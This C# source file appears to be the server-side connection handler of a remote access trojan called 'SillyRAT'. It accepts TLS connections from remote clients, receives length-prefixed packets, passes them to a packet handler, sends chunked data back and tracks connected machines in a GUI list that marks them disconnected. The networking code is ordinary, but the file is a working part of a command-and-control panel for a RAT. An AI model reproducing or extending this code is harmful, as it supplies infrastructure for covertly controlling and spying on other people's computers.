using System;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.Net.Sockets;
using System.Net.Security;
using System.Threading.Tasks;
using System.Drawing;
using SillyRAT;
using Server.Handlers;
using System.Net;

namespace Server.Connection
{
    public class SillyClient
    {
        public static int OneMb = 1000000;
        public TcpClient tcpClient { get; set; }
        private SslStream sslStream { get; set; }
        private CancellationTokenSource cancellationToken { get; set; }
        public string uid { get; set; }
        public string password { get; set; }
        public ListViewItem listViewItem { get; set; }
        private static object SendOneByOne { get; set; }

        string clientip;

        public SillyClient(TcpClient sillytcp, SslStream stream)
        {
            tcpClient = sillytcp;
            sslStream = stream;
            SendOneByOne = new object();
            clientip = tcpClient.Client.RemoteEndPoint.ToString();
            cancellationToken = new CancellationTokenSource();

            Task.Run(() => { Recieve(); }, cancellationToken.Token);
        }

        public static TcpClient ConnectToServer(string host, int port)
        {
            TcpClient client = new TcpClient();
            try
            {
                var addresses = Dns.GetHostAddresses(host);
                if (addresses.Length > 0)
                {
                    client.Connect(addresses[0], port);
                }
                else
                {
                    throw new Exception("No addresses found for the specified host");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error connecting to server: {ex.Message}");
                client.Dispose();
                throw;
            }
            return client;
        }

        private async void Recieve()
        {
            try
            {
                while (true)
                {
                    if (tcpClient == null) throw new Exception("Client has no connection");

                    byte[] bytes = new byte[4];
                    int byteSize = await sslStream.ReadAsync(bytes, 0, bytes.Length);
                    byteSize = BitConverter.ToInt32(bytes, 0);

                    if (byteSize > 0)
                    {
                        bytes = new byte[byteSize];
                        int totalRecieved = 0;
                        while (totalRecieved < byteSize)
                        {
                            totalRecieved += await sslStream.ReadAsync(bytes, totalRecieved, bytes.Length - totalRecieved);
                        }
                        ThreadPool.QueueUserWorkItem(state =>
                        {
                            new HandlePacket
                            {
                                SillyClient = this,
                                packet = bytes
                            }.Run(state);
                        }, null);
                    }
                    else
                    {
                        Program.form2.AddLog("Connection lost", Color.FromArgb(255, 164, 54));
                        Disconnect();
                        return;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Disconnect();
            }
        }

        public void Send(byte[] bytes)
        {
            lock (SendOneByOne)
            {
                try
                {
                    byte[] byteSize = BitConverter.GetBytes(bytes.Length);
                    sslStream.Write(byteSize, 0, byteSize.Length);
                    sslStream.Flush();

                    if (bytes.Length > OneMb)
                    {
                        using (MemoryStream memoryStream = new MemoryStream(bytes))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[OneMb];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                sslStream.Write(chunk, 0, read);
                                sslStream.Flush();
                            }
                        }
                    }
                    else
                    {
                        sslStream.Write(bytes, 0, bytes.Length);
                        sslStream.Flush();
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                    Disconnect();
                }
            }
        }

        public bool isConnected()
        {
            if (tcpClient == null) return false;
            return tcpClient.Connected;
        }

        public void Disconnect()
        {
            if (tcpClient == null) return;
            try
            {
                Program.form2.Invoke(new MethodInvoker(() =>
                {
                    Program.form2.AddLog($"Client {listViewItem.SubItems[0].Text} disconnected, status updated", Color.Red);
                    Program.form2.listView2.BeginUpdate();

                    if (listViewItem != null)
                    {
                        listViewItem.SubItems[7].Text = "Disconnected";
                        listViewItem.ForeColor = Color.Red;
                    }

                    Program.form2.listView2.EndUpdate();
                }));
                cancellationToken?.Cancel();
                tcpClient?.Close();
                tcpClient?.Dispose();
                sslStream?.Dispose();
                sslStream = null;
                tcpClient = null;
                cancellationToken = null;
                GC.Collect();
            }
            catch { }
        }
    }
}
